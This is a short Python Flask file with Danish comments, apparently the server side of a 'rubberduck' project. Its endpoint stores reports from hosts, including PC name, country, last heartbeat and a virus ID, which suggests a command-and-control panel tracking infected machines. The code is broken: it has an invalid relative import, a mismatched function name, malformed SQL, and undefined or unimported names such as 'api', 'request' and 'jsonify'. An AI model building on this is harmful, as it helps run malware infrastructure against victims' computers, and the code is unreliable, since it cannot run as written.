import requests
import flask 
import sqlite3
import .models
import socket
import os
import socketio
import json
import collections
import esp32


def dbconnect ():
    global conn 
    conn = sqlite3.connect('/var/www/rubberduck/databasen.db')
    global curs
    curs = conn.cursor()

# Gemmer de forskellige data, i de rigtige rows i den rigtige tabel
@api.route('/databasen.db', methods=['POST'])
def gemdatahost ():
    print("gemmer")
    data = json.loads(request.get_json())
    print(data)
    id = data['id']
    pcname = data['pc_name']
    country = data['country']
    hostnotes = data['host_notes']
    settings = data['settings']
    lastheartbest = data['last_heartbeat']
    userid = data['user_id']
    virusid = data['virus_id']

    # if 
    try:
        dbConnect()
        curs.execute("INSERT INTO TABLE (pcname,country,hostnotes,settings,lastheartbest,userid,virusid) VALUES (?, ?, ?, ?, ?, ?, ?)", (pcname,country,hostnotes,settings,lastheartbest,userid,virusid))
        conn.commit()
        conn.close()
        print("Success")
        return jsonify({'message': 'success'})
    except Exception as e:
        print(e)
        return jsonify({'message': e})

